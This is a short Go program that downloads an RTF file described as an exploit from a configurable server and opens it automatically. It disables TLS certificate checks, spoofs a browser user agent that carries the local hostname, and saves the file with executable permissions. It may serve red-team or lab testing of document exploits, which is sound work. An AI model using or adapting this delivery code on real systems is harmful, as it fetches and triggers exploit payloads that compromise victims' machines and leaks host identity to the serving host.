package main

import (
	"os"
	"io"
	"log"
	"flag"
	"fmt"	
	"time"
	"net"
	"net/http"	
	"crypto/tls"
	"io/ioutil"

	"github.com/skratchdot/open-golang/open"
)

type Config struct {
	url string 
	agent string
	filename string
}

var config Config

func main() {
	//Command line switches
	var (
		url = flag.String("url", "http://127.0.0.1:80", "Target server to download exploit from")	
		agent = flag.String("ua", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0", "Default User Agent")
		filename = flag.String("filename", "download.rtf", "File to download RTF to")
	)

	flag.Parse()

	config = Config{*url, *agent, *filename}

	file, _ := os.OpenFile("run.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
    defer file.Close()
    mw := io.MultiWriter(os.Stdout, file)
	log.SetOutput(mw)

	//add hostname as part of user agent string
	hostname, _ := os.Hostname()
	config.agent = fmt.Sprintf("%s %s", config.agent, hostname) 

	//request for rtf file, exploit should automatically follow
	client := httpClient()
	req, _ := http.NewRequest("GET", config.url + "/download.rtf", nil)
	req.Header.Set("User-Agent", config.agent)
	resp, _ := client.Do(req)

	data, _ := ioutil.ReadAll(resp.Body)
	f, _ := os.OpenFile(config.filename, os.O_CREATE|os.O_WRONLY, 0755)
	f.Write(data)
	f.Close()

	open.Run(config.filename)
}

// httpClient returns a new HTTP client with appropriate timeouts set.
func httpClient() *http.Client {
	var d = &net.Dialer{
		Timeout: 5 * time.Second,
	}

	var tr = &http.Transport{
		Dial:                d.Dial,
		TLSHandshakeTimeout: 5 * time.Second,
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	return &http.Client{
		Timeout:   10 * time.Second,
		Transport: tr,
	}
}
